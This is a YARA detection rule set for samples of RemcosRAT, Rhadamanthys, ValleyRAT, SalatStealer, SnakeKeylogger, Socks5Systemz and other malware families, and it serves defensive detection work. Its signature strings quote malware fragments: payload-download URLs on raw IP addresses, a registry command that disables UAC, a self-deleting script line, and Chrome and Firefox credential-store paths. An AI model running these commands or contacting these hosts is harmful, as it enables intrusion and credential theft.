/*
   YARA Rule Set
   Author: Metin Yigit
   Date: 2025-09-10
   Identifier: _subset_batch
   Reference: internal
*/

/* Rule Set ----------------------------------------------------------------- */

import "pe"

rule RemcosRAT_signature__4f67aeda01a0484282e8c59006b0b352_imphash_ {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_4f67aeda01a0484282e8c59006b0b352(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8fff00cf201e75ce64dac4109780d57b122deed394ded3d8867a43a85516a23e"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "lnindtgt.exe" fullword wide /* score: '22.00'*/
      $s3 = "nstall System v3.01</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s4 = "worriless" fullword wide /* score: '8.00'*/
      $s5 = "initialiserede" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and all of them
}


rule RemcosRAT_signature__9a16e282eba7cc710070c0586c947693_imphash_ {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_9a16e282eba7cc710070c0586c947693(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d223a2f132ab3c96f3d16cfdb00d11efce9d9068ee2627c089a76d1e15274656"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.11</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s3 = "~nsu%X.tmp" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__ea4e67a31ace1a72683a99b80cf37830_imphash_ {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_ea4e67a31ace1a72683a99b80cf37830(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8c459da35cc2a38d218859f9fb816013c0d33c4bdd3792a69c20beaf5609687d"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssem" ascii /* score: '25.00'*/
      $s3 = "endency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"as" ascii /* score: '22.00'*/
      $s4 = "nstall System v3.06.1</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Comm" ascii /* score: '13.00'*/
      $s5 = "oker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compati" ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__ff26bb14d4e19e4acf769fa08a4b854b_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_ff26bb14d4e19e4acf769fa08a4b854b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f553605fb8722472509ee1612fe24c835aec8d7a71d3554d59983f3524467725"
   strings:
      $s1 = "Alt+ Clipboard does not support Icons/Menu '%s' is already being used by another formDocked control must have a name%Error remo" wide /* score: '16.00'*/
      $s2 = "Elevation<" fullword ascii /* score: '16.00'*/
      $s3 = "+3D effect percent must be between %d and %d+Circular Series dependences are not allowed+Bar Width Percent must be between 1 and" wide /* score: '16.00'*/
      $s4 = "iVCF6VCN6VCV6" fullword ascii /* base64 encoded string 'T!zT#zT%z' */ /* score: '14.00'*/
      $s5 = " http://crl.verisign.com/pca3.crl0" fullword ascii /* score: '13.00'*/
      $s6 = "Set Size Exceeded.*Error on call Winsock2 library function %s&Error on loading Winsock2 library (%s)DThis authentication method " wide /* score: '12.00'*/
      $s7 = "5VCR6VCR8" fullword ascii /* base64 encoded string 'T$zT$|' */ /* score: '11.00'*/
      $s8 = "%VCF5VCN5VCV5" fullword ascii /* base64 encoded string 'T!yT#yT%y' */ /* score: '11.00'*/
      $s9 = "OnGetBarStyle0" fullword ascii /* score: '10.00'*/
      $s10 = "Q\\Ot:\\Tw:dZXMhTtG^OX-VJs=]" fullword ascii /* score: '10.00'*/
      $s11 = "eMXDo.XeI" fullword ascii /* score: '10.00'*/
      $s12 = "TCircledSeries4" fullword ascii /* score: '10.00'*/
      $s13 = "Common Engineering Services1" fullword ascii /* score: '10.00'*/
      $s14 = "TCircledSeries" fullword ascii /* score: '9.00'*/
      $s15 = "474?4\\4|4" fullword ascii /* score: '9.00'*/ /* hex encoded string 'GDD' */
   condition:
      uint16(0) == 0x5a4d and filesize < 12000KB and
      8 of them
}

rule ValleyRAT_signature__9b5d64ca9f87b73db4240f21f950c39d_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_9b5d64ca9f87b73db4240f21f950c39d(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5a5d01bb8a5126458d447026dc2572deb74e86619c87f1d0591dff43c141073e"
   strings:
      $s1 = "ATC.EXE" fullword wide /* score: '19.00'*/
      $s2 = "\\debug.log" fullword wide /* score: '17.00'*/
      $s3 = "[!] GetTempPathW " fullword ascii /* score: '16.00'*/
      $s4 = "MaldevAcad.tmp" fullword wide /* score: '13.00'*/
      $s5 = "http://38.47.97.210:1978/" fullword wide /* score: '12.00'*/
      $s6 = "           <requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\"/>" fullword ascii /* score: '11.00'*/
      $s7 = "   processorArchitecture=\"X86\"" fullword ascii /* score: '10.00'*/
      $s8 = ":55555555" fullword ascii /* score: '9.00'*/ /* hex encoded string 'UUUU' */
      $s9 = "basdewesdfs" fullword ascii /* score: '8.00'*/
      $s10 = "hcbreeds" fullword ascii /* score: '8.00'*/
      $s11 = "asdgwesdess" fullword ascii /* score: '8.00'*/
      $s12 = "iiiiiiiiiiiiiix" fullword ascii /* score: '8.00'*/
      $s13 = "zbxdsveeds" fullword ascii /* score: '8.00'*/
      $s14 = "dbfasdadfewssd" fullword ascii /* score: '8.00'*/
      $s15 = "iiiiiiiiix" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule ValleyRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__67c39f2e {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_67c39f2e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "67c39f2e56dc93e4b6f16b4658366462f8f90acad03792b2f5c1797bd9f89702"
   strings:
      $x1 = "http://23.248.202.194/user4/awesomium.dll" fullword ascii /* score: '31.00'*/
      $s2 = "http://23.248.202.194/user4/GG.exe" fullword ascii /* score: '30.00'*/
      $s3 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii /* score: '27.00'*/
      $s4 = "http://23.248.202.194/user4/hello.bin" fullword ascii /* score: '26.00'*/
      $s5 = "DComdlg32.dll" fullword wide /* score: '26.00'*/
      $s6 = "DKernel32.dll" fullword wide /* score: '23.00'*/
      $s7 = "Dkernel32.dll" fullword wide /* score: '23.00'*/
      $s8 = "HongTai.exe" fullword wide /* score: '22.00'*/
      $s9 = "%s\\awesomium.dll" fullword ascii /* score: '20.00'*/
      $s10 = "_SlHNqQyRq.exe" fullword wide /* score: '19.00'*/
      $s11 = "%s\\SystemHelper.exe" fullword ascii /* score: '18.00'*/
      $s12 = "windowsSettings><dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware></windowsSettings></app" ascii /* score: '17.00'*/
      $s13 = "66666.Scr" fullword wide /* score: '15.00'*/
      $s14 = "<</Type /FontDescriptor" fullword ascii /* score: '14.00'*/
      $s15 = "D:\\a\\_work\\1\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\auxdata.cpp" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      1 of ($x*) and 4 of them
}

rule Rhadamanthys_signature__39525b45c40c6c59481ed9e5dc908b2d_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_39525b45c40c6c59481ed9e5dc908b2d(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "df9c29d572bb487183074120585275e5ef17f5baf00da512de2e7517ced89d8e"
   strings:
      $s1 = "   -f      Dump file headers" fullword ascii /* score: '26.00'*/
      $s2 = "   -s      Dump section headers" fullword ascii /* score: '26.00'*/
      $s3 = "   -a      Dump everything" fullword ascii /* score: '21.00'*/
      $s4 = "  ProcessContext(%X)" fullword ascii /* score: '15.00'*/
      $s5 = "       Compiler: %s - front end [%d.%d bld %d] - back end [%d.%d bld %d]" fullword ascii /* score: '15.00'*/
      $s6 = "    GetFpoFrameBase: PC %X, Func %X, first %d, FPO %p [%d,%d,%d]" fullword ascii /* score: '12.50'*/
      $s7 = " - symbol prompts on" fullword ascii /* score: '12.00'*/
      $s8 = " - symbol prompts off" fullword ascii /* score: '12.00'*/
      $s9 = "Tolgres.kjk" fullword ascii /* score: '10.00'*/
      $s10 = "GenReadTlsDirectory.ReadQSUV" fullword ascii /* score: '10.00'*/
      $s11 = "Plak.ecp" fullword ascii /* score: '10.00'*/
      $s12 = "  Unable to read basic unwind info at %I64X" fullword ascii /* score: '10.00'*/
      $s13 = "  %02X: Code %X offs %03X, RSP %I64X" fullword ascii /* score: '9.00'*/
      $s14 = "      processed a user callback, args %u" fullword ascii /* score: '9.00'*/
      $s15 = " - Can't validate symbols, if present." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule SalatStealer_signature__94400fe3e62cd2376124312fe435b8e4_imphash_ {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_94400fe3e62cd2376124312fe435b8e4(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c42ae157d6add456789a59d83c8824e1443333eecae6e5e840059acf3d2058fe"
   strings:
      $s1 = "/c ping -n 3 127.0.0.1 & copy /Y \"" fullword ascii /* score: '20.00'*/
      $s2 = "* [Va$o" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 11000KB and
      all of them
}

rule SalatStealer_signature__d5d9d937853db8b666bd4b525813d7bd_imphash_ {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_d5d9d937853db8b666bd4b525813d7bd(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "32f460c5c96bfeb88df8fbdef81bba4ff976662c1661db0a9eb3dddc3758f1bc"
   strings:
      $s1 = "/c ping -n 3 127.0.0.1 & copy /Y \"" fullword ascii /* score: '20.00'*/
      $s2 = "* Q#8c" fullword ascii /* score: '9.00'*/
      $s3 = "$\"51,.*'" fullword ascii /* score: '9.00'*/ /* hex encoded string 'Q' */
      $s4 = "nIRcX>_G/:3yC" fullword ascii /* score: '9.00'*/
      $s5 = "kiznxrt" fullword ascii /* score: '8.00'*/
      $s6 = "wagkotj" fullword ascii /* score: '8.00'*/
      $s7 = "CR3W>9" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 25000KB and
      all of them
}

rule SnakeKeylogger_signature__8e1ca82498002da7f4efcb6c1aab495b_imphash_ {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_8e1ca82498002da7f4efcb6c1aab495b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0201652520917243e47dbe8f9b2d32b4bb1764b9398426c097ea6d2e993a3750"
   strings:
      $x1 = "]*\\AC:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Templates\\Stub\\Project1.vbp" fullword wide /* score: '38.00'*/
      $s2 = "(Email): helloworld@yahoo.com" fullword ascii /* score: '23.00'*/
      $s3 = "BMS - System Login Screen" fullword ascii /* score: '23.00'*/
      $s4 = "cmdlogin" fullword ascii /* score: '22.00'*/
      $s5 = "kinos.exe" fullword wide /* score: '22.00'*/
      $s6 = "BMS - Change Password Screen" fullword ascii /* score: '20.00'*/
      $s7 = "loginbar" fullword ascii /* score: '19.00'*/
      $s8 = "txtlogin" fullword ascii /* score: '19.00'*/
      $s9 = "select * from users where loginid = '" fullword wide /* score: '19.00'*/
      $s10 = "51284E47617760614E4267707E7B714E" wide /* score: '19.00'*/ /* hex encoded string 'Q(NGaw`aNBgp~{qN' */
      $s11 = "Executei`" fullword ascii /* score: '18.00'*/
      $s12 = "60.DLL" fullword ascii /* score: '17.00'*/
      $s13 = "Login ID Does Not Exist! Enter Correct Login ID" fullword wide /* score: '17.00'*/
      $s14 = "Change System User's Password:" fullword ascii /* score: '15.00'*/
      $s15 = "BMS - SYSTEM CONTROL PANEL" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      1 of ($x*) and 4 of them
}

rule Socks5Systemz_signature__884310b1928934402ea6fec1dbd3cf5e_imphash_ {
   meta:
      description = "_subset_batch - file Socks5Systemz(signature)_884310b1928934402ea6fec1dbd3cf5e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "eec434b60d0854c163e3b1dbd8f88746cfd0f6153789572990d4ffa192d894a4"
   strings:
      $s1 = "            <requestedExecutionLevel level=\"asInvoker\"            uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s2 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s3 = "            processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s4 = "!\">{74[+" fullword ascii /* score: '9.00'*/ /* hex encoded string 't' */
      $s5 = "            publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
      $s6 = "ldezeuv" fullword ascii /* score: '8.00'*/
      $s7 = "jfufafi" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 14000KB and
      all of them
}

rule Socks5Systemz_signature__884310b1928934402ea6fec1dbd3cf5e_imphash__2c702fe6 {
   meta:
      description = "_subset_batch - file Socks5Systemz(signature)_884310b1928934402ea6fec1dbd3cf5e(imphash)_2c702fe6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2c702fe6281b0934ae16be7fc5d4d5eb035fdf87ffc3e3e2dec9b9a2f2babaac"
   strings:
      $s1 = "            <requestedExecutionLevel level=\"asInvoker\"            uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s2 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s3 = "            processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s4 = "qxtlK.EAP" fullword ascii /* score: '10.00'*/
      $s5 = "# -PUyX" fullword ascii /* score: '9.00'*/
      $s6 = "* x\\RrC" fullword ascii /* score: '9.00'*/
      $s7 = "`- -KX," fullword ascii /* score: '9.00'*/
      $s8 = "            publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
      $s9 = "WfwG]M -" fullword ascii /* score: '8.00'*/
      $s10 = "NTjS!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 14000KB and
      all of them
}

rule Socks5Systemz_signature__884310b1928934402ea6fec1dbd3cf5e_imphash__5b3b428c {
   meta:
      description = "_subset_batch - file Socks5Systemz(signature)_884310b1928934402ea6fec1dbd3cf5e(imphash)_5b3b428c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5b3b428c2625b3c8278b9b3a1d14002ef4760df42439db17efd3576ae952c6ca"
   strings:
      $s1 = "            <requestedExecutionLevel level=\"asInvoker\"            uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s2 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s3 = "* !]EufBzU$" fullword ascii /* score: '12.00'*/
      $s4 = "            processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s5 = "* *Wt7" fullword ascii /* score: '9.00'*/
      $s6 = "* hRjd" fullword ascii /* score: '9.00'*/
      $s7 = "            publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 11000KB and
      all of them
}

rule Socks5Systemz_signature__884310b1928934402ea6fec1dbd3cf5e_imphash__71a2c517 {
   meta:
      description = "_subset_batch - file Socks5Systemz(signature)_884310b1928934402ea6fec1dbd3cf5e(imphash)_71a2c517.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "71a2c517ebca75a515e9d3adf45a27f967e6e42c0f3da2525088c612a2712339"
   strings:
      $s1 = "            <requestedExecutionLevel level=\"asInvoker\"            uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s2 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s3 = "            processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s4 = "ymoo0w:\\" fullword ascii /* score: '10.00'*/
      $s5 = "BGKD.IWT" fullword ascii /* score: '10.00'*/
      $s6 = "98jMwSx.RWX" fullword ascii /* score: '10.00'*/
      $s7 = "* \\[Nd" fullword ascii /* score: '9.00'*/
      $s8 = "xIRCc1w" fullword ascii /* score: '9.00'*/
      $s9 = "* #PHY)" fullword ascii /* score: '9.00'*/
      $s10 = "            publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 12000KB and
      all of them
}

rule Socks5Systemz_signature__884310b1928934402ea6fec1dbd3cf5e_imphash__d6fa3a64 {
   meta:
      description = "_subset_batch - file Socks5Systemz(signature)_884310b1928934402ea6fec1dbd3cf5e(imphash)_d6fa3a64.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d6fa3a64a1017e5fcf191f02cd574963c6f10f270531c8ff763401d13951dc40"
   strings:
      $s1 = "            <requestedExecutionLevel level=\"asInvoker\"            uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s2 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s3 = "            processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s4 = "* Cxs|" fullword ascii /* score: '9.00'*/
      $s5 = "            publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
      $s6 = "NuPF+ %j" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule RemcosRAT_signature__8b3e0763eddbb01367bd21396e110071_imphash_ {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_8b3e0763eddbb01367bd21396e110071(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8f4cb5ddc22fbf3f8118eaa14c1cbb7aae10ba6b65ff44cb2345b10f2eb48304"
   strings:
      $x1 = "C:\\Windows\\System32\\cmd.exe" fullword ascii /* score: '38.00'*/
      $x2 = "/k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWOR" ascii /* score: '34.00'*/
      $x3 = "/k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWOR" ascii /* score: '34.00'*/
      $s4 = "CreateObject(\"WScript.Shell\").Run \"cmd /c \"\"" fullword wide /* score: '26.00'*/
      $s5 = "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\" fullword ascii /* score: '23.00'*/
      $s6 = "rmclient.exe" fullword wide /* score: '22.00'*/
      $s7 = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" fullword ascii /* score: '22.00'*/
      $s8 = "Keylogger initialization failure: error " fullword ascii /* score: '20.00'*/
      $s9 = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders" fullword ascii /* score: '19.00'*/
      $s10 = "Offline Keylogger Started" fullword ascii /* score: '17.00'*/
      $s11 = "Online Keylogger Started" fullword ascii /* score: '17.00'*/
      $s12 = "Offline Keylogger Stopped" fullword ascii /* score: '17.00'*/
      $s13 = "Online Keylogger Stopped" fullword ascii /* score: '17.00'*/
      $s14 = "fso.DeleteFile(Wscript.ScriptFullName)" fullword wide /* score: '17.00'*/
      $s15 = "Executing file: " fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule SkuldStealer_signature__f83741541cbf6c34f2147d55fb8f4100_imphash_ {
   meta:
      description = "_subset_batch - file SkuldStealer(signature)_f83741541cbf6c34f2147d55fb8f4100(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2d62c9fb90cd4e709ad4397dcb70af9d2af443bded9e9d210fe8af5dd216c782"
   strings:
      $s1 = "vcruntime140.dll" fullword ascii /* score: '26.00'*/
      $s2 = "DCRC failed in the encrypted file %s. Corrupt file or wrong password." fullword wide /* score: '25.00'*/
      $s3 = "python311.dll" fullword ascii /* score: '23.00'*/
      $s4 = "python3.dll" fullword ascii /* score: '23.00'*/
      $s5 = "program.exe" fullword ascii /* score: '22.00'*/
      $s6 = "lib/multiprocessing/popen_spawn_win32.pyc" fullword ascii /* score: '21.00'*/
      $s7 = "lib/multiprocessing/spawn.pyc" fullword ascii /* score: '21.00'*/
      $s8 = "lib/multiprocessing/popen_spawn_posix.pyc" fullword ascii /* score: '21.00'*/
      $s9 = "lib/libcrypto-1_1.dll" fullword ascii /* score: '20.00'*/
      $s10 = "lib/libffi-8.dll" fullword ascii /* score: '20.00'*/
      $s11 = "lib/libssl-1_1.dll" fullword ascii /* score: '20.00'*/
      $s12 = "Setup=program.exe" fullword ascii /* score: '19.00'*/
      $s13 = "d:\\Projects\\WinRAR\\SFX\\build\\sfxzip64\\Release\\sfxzip.pdb" fullword ascii /* score: '19.00'*/
      $s14 = "lib/multiprocessing/context.pyc" fullword ascii /* score: '18.00'*/
      $s15 = "lib/multiprocessing/connection.pyc" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 26000KB and
      8 of them
}

rule ValleyRAT_signature__71d8340344d1f2c98964bc46476d20e1_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_71d8340344d1f2c98964bc46476d20e1(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b6d6ff28ef103da5f794d27841f13b790329616cea55b7ec8f181585b5beb638"
   strings:
      $s1 = "c:\\users\\administrator\\documents\\visual studio 2015\\Projects\\ConsoleApplication10\\Release\\ConsoleApplication10.pdb" fullword ascii /* score: '29.00'*/
      $s2 = "(Symantec SHA256 TimeStamping Signer - G3" fullword ascii /* score: '15.00'*/
      $s3 = "(Symantec SHA256 TimeStamping Signer - G30" fullword ascii /* score: '15.00'*/
      $s4 = ",Tencent Technology(Shenzhen) Company Limited1" fullword ascii /* score: '14.00'*/
      $s5 = ",Tencent Technology(Shenzhen) Company Limited0" fullword ascii /* score: '14.00'*/
      $s6 = "http://sf.symcb.com/sf.crl0a" fullword ascii /* score: '13.00'*/
      $s7 = "3_3X3O3" fullword ascii /* reversed goodware string '3O3X3_3' */ /* score: '11.00'*/
      $s8 = "3_3W3O3" fullword ascii /* reversed goodware string '3O3W3_3' */ /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule Renamer_signature__c00b6ba7dbbc6abee9ace3a65a49ba24_imphash_ {
   meta:
      description = "_subset_batch - file Renamer(signature)_c00b6ba7dbbc6abee9ace3a65a49ba24(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4667778efed63cfd5317bd2e9451f885ea235d110b99deda5f74c11a9167066c"
   strings:
      $s1 = "icon=%SystemRoot%\\system32\\SHELL32.dll,4" fullword wide /* score: '30.00'*/
      $s2 = "shell\\open\\command=" fullword wide /* score: '17.00'*/
      $s3 = "DropTarget<qD" fullword ascii /* score: '16.00'*/
      $s4 = "Alt+ Clipboard does not support Icons+Operation not supported on selected printer" fullword wide /* score: '16.00'*/
      $s5 = "Commandh" fullword ascii /* score: '14.00'*/
      $s6 = "        <requestedExecutionLevel" fullword ascii /* score: '11.00'*/
      $s7 = "OnDrawItemP" fullword ascii /* score: '11.00'*/
      $s8 = "        processorArchitecture=\"*\"/>" fullword ascii /* score: '10.00'*/
      $s9 = "    processorArchitecture=\"*\"/>" fullword ascii /* score: '10.00'*/
      $s10 = "RootKey@" fullword ascii /* score: '10.00'*/
      $s11 = "C:\\Windows\\Paint" fullword wide /* score: '10.00'*/
      $s12 = "hold.inf" fullword wide /* score: '10.00'*/
      $s13 = "2'2,2d2{2" fullword ascii /* score: '9.00'*/ /* hex encoded string '"-"' */
      $s14 = "5(5,5<5[5|5" fullword ascii /* score: '9.00'*/ /* hex encoded string 'UUU' */
      $s15 = "EInvalidGraphicOperationhhD" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule Rhadamanthys_signature__4ff126a37cacf7b37858d8f2b2459f60_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_4ff126a37cacf7b37858d8f2b2459f60(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9deb2baeb081e01d0eb2454839edb37094aacae1f093cadf0e648a3774b62950"
   strings:
      $s1 = "Neetchart.mcc" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 16000KB and
      all of them
}

rule Rhadamanthys_signature__b4f070f0028c97d4b44509b262314b3d_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_b4f070f0028c97d4b44509b262314b3d(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c0d0eef15ed5fa87fb6f39cc9430fdfbf0625e94c05ba57faa0940027ea6d2ad"
   strings:
      $s1 = "VCRUNTIME140_1.dll" fullword ascii /* score: '23.00'*/
      $s2 = "d:\\a01\\_work\\12\\s\\\\binaries\\amd64ret\\bin\\amd64\\\\mfc140u.amd64.pdb" fullword ascii /* score: '22.00'*/
      $s3 = "y%TsMFC140%Ts.DLL" fullword wide /* score: '20.00'*/
      $s4 = "4042444648" ascii /* score: '17.00'*/ /* hex encoded string '@BDFH' */
      $s5 = "%s%s%X.tmp" fullword wide /* score: '15.00'*/
      $s6 = "d:\\a01\\_work\\12\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\oledrop2.cpp" fullword wide /* score: '15.00'*/
      $s7 = "Nhttp://www.microsoft.com/pkiops/crl/Microsoft%20Time-Stamp%20PCA%202010(1).crl0l" fullword ascii /* score: '13.00'*/
      $s8 = "Phttp://www.microsoft.com/pkiops/certs/Microsoft%20Time-Stamp%20PCA%202010(1).crt0" fullword ascii /* score: '13.00'*/
      $s9 = "d:\\a01\\_work\\12\\s\\src\\vctools\\vc7libs\\ship\\atlmfc\\include\\afxwin1.inl" fullword wide /* score: '13.00'*/
      $s10 = "d:\\a01\\_work\\12\\s\\src\\vctools\\vc7libs\\ship\\atlmfc\\include\\afxwin2.inl" fullword wide /* score: '13.00'*/
      $s11 = "d:\\a01\\_work\\12\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\afxstate.cpp" fullword wide /* score: '13.00'*/
      $s12 = "d:\\a01\\_work\\12\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\appcore.cpp" fullword wide /* score: '13.00'*/
      $s13 = "d:\\a01\\_work\\12\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\array_s.cpp" fullword wide /* score: '13.00'*/
      $s14 = "d:\\a01\\_work\\12\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\auxdata.cpp" fullword wide /* score: '13.00'*/
      $s15 = "d:\\a01\\_work\\12\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\dbcore.cpp" fullword wide /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 17000KB and
      8 of them
}

